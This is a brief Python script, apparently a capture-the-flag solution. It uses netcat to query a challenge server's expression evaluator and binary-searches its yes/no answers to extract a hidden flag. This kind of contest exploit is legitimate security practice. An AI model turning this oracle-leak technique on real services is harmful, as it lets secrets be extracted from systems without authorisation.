import subprocess

code = 'if (flag > {}) then 1 else 0'

n = 8 * 36
low = 0
high = 1 << n

while low <= high:
    mid = (low + high) >> 1

    process = subprocess.Popen(['nc', 'wolf.chal.pwning.xxx', '6808'], stdin=subprocess.PIPE, stdout=subprocess.PIPE)
    out, err = process.communicate(code.format(mid))

    if out[0] == '1':
        low = mid + 1
    else:
        high = mid - 1
    print (low, high)

print ('%0{}x'.format(n) % low).decode('hex')
